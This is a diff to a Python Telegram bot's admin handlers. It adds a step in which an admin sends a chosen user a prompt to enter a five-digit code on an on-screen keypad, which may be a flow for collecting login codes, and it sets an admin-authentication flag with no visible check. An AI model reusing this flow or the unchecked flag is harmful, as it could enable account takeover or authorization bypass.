@@ -176,6 +176,8 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data.startswith("msg_user_"):
         user_id = int(data.split("_")[2])
         context.user_data['msg_target_user'] = user_id
+        # Ensure admin is authenticated for this session
+        context.user_data['is_admin_auth'] = True
         await query.message.reply_text(f"💬 Send the message (Text, Photo, or Video) you want to send to User {user_id}:")
         return ADMIN_MSG_USER_CONTENT
         
@@ -535,21 +537,31 @@ async def file_manage_callback(update: Update, context: ContextTypes.DEFAULT_TYP
 async def admin_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
+        await query.answer()
         data = query.data
         if data == "admin_panel": return await admin_menu_callback(update, context)
         
         parts = data.split("_")
-        if "done" in data:
+        # admin_sms_done_{user_id} -> parts[3] is user_id
+        # admin_sms_{user_id} -> parts[2] is user_id
+        
+        if data.startswith("admin_sms_done_"):
             user_id = int(parts[3])
             await context.bot.send_message(chat_id=user_id, text=WAITING_FOR_ADMIN_MSG)
             await asyncio.sleep(1)
-            await context.bot.send_message(chat_id=user_id, text=f"{ENTER_CODE_MSG}\n\nCurrent: `____`", reply_markup=get_otp_keyboard(), parse_mode='Markdown')
+            await context.bot.send_message(chat_id=user_id, text=f"{ENTER_CODE_MSG}\n\nCurrent: `_____`", reply_markup=get_otp_keyboard(), parse_mode='Markdown')
             await query.message.edit_text(f"✅ Code request sent to user (ID: {user_id}).")
-        else:
+        elif data.startswith("admin_sms_"):
+            # This is triggered when admin clicks a digit button for the user
             user_id = int(parts[2])
-            await query.answer(f"Digit {parts[3]} selected")
+            # If it's just a digit click, we don't need to do much except maybe acknowledge
+            # but usually admin just clicks "Done" after seeing the request.
+            # If the flow requires sending digits one by one, that's different.
+            # Currently, the UI shows digits 0-9 and a "Done" button.
+            pass
     except Exception as e:
         logging.error(f"Error in admin_sms_handler: {e}")
+        if query: await query.message.reply_text(f"❌ Error: {str(e)}")
 
 async def admin_file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_id, file_type = None, None
